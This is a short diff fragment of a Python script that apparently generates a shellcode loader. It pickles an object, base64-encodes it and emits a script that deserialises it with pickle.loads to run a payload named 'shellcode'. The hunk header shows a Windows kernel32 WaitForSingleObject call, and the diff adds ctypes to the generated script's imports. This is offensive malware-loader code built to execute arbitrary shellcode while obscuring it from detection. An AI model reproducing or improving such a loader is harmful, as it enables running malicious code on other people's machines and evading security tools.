@@ -47,7 +47,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)
     ret = pickle.dumps(A())
     ret_base64 = base64.b64encode(ret)
 
-    output = '''import base64, pickle
+    output = '''import base64, pickle, ctypes
 shellcode = {}
 pickle.loads(base64.b64decode(shellcode))
 '''.format(ret_base64)
